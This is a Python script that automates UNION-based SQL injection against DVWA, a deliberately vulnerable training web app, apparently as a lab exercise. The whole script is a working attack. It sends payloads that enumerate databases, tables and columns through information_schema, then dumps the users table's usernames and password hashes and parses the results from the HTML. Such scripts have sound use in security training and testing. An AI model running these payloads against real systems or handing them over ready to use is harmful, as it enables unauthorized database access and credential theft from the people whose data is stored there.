import requests
import urllib3
from bs4 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxy = {
    "http":"http://127.0.0.1:8080",
    "https":"http://127.0.0.1:8080"
}

url = "http://dvwa.lab:8001/vulnerabilities/sqli/"


cookies = {
    "PHPSESSID" : "2aba0f57c964b8b1f1b5279ad7991c6b",
    "security" : "low"
}

# Listing Databases
payload = "' UNION SELECT schema_name,NULL FROM information_schema.schemata-- -"

params = {
    "id" : "" + payload,
    "Submit" : "Submit"
}

r = requests.get(url, cookies=cookies, params=params, verify=False)
bs = BeautifulSoup(r.text, 'html.parser')
dbs = bs.find_all('pre')
print("[+] Available Databases")
for d in dbs:
    print(f"-> {d.find('br').next_sibling.text.split()[-1]}")


# Listing tables in dvwa db
payload = "' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema='dvwa'-- -"

params = {
    "id" : "" + payload,
    "Submit" : "Submit"
}

r = requests.get(url, cookies=cookies, params=params, verify=False)
bs = BeautifulSoup(r.text, 'html.parser')
tbs = bs.find_all('pre')
print("\n[+] Listing tables in dvwa db")
for t in tbs:
    print(f"-> {t.find('br').next_sibling.text.split()[-1]}")


# Listing columns in users table
payload = "' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'-- -"

params = {
    "id" : "" + payload,
    "Submit" : "Submit"
}

r = requests.get(url, cookies=cookies, params=params, verify=False)
bs = BeautifulSoup(r.text, 'html.parser')
cols = bs.find_all('pre')
print("\n[+] Listing columns in users table")
for c in cols:
    print(f"-> {c.find('br').next_sibling.text.split()[-1]}")



# Dumping Users Table
payload = "' UNION SELECT user,password FROM users;-- -"

params = {
    "id" : "" + payload,
    "Submit" : "Submit"
}

r = requests.get(url, cookies=cookies, params=params, verify=False)
bs = BeautifulSoup(r.text, 'html.parser')
creds = bs.find_all('pre')
print("\n[+] Dumping Users Table")
print("Username \t Password")
for c in creds:
    x = c.text.split(': ')
    print(f'{x[-2][:-7]} \t\t {x[-1]}')